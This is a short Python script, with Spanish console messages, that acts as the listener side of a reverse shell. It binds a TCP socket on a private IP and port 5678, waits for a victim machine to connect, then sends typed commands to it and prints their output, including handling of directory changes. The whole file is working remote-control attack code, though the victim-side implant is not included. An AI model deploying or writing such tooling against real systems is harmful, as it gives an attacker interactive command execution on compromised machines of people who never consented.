import socket
import os 
import subprocess


def shell():
    current_dir=target.recv(3000)
    while True:
        command = input(f"{current_dir}-#: ").encode('utf-8')
        if command.decode('utf-8') == "exit":
            break
        elif command.decode('utf-8').find("cd") == 0:
            target.send(command)
            res=target.recv(3000)
            current_dir=res
        else:
            try:
                target.send(command)
                res=target.recv(3000)
                if res == "1":
                    continue
                elif command.decode('utf-8') == "":
                    pass
                else:
                    print(res.decode('utf-8'))
            except:
                print("Ocurrio un error con el comando insertado")
                pass
def config():
    global server 
    global target
    global ip 
    global port 
    
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = "192.168.94.1"
port = 5678
server.bind((ip,port))
server.listen(5)
print("corriendo servidor, esperando conexiones....")
while True:
    target, addr = server.accept()
    print("conexion establecida desde", addr)
    break

config()
shell()
target.close()

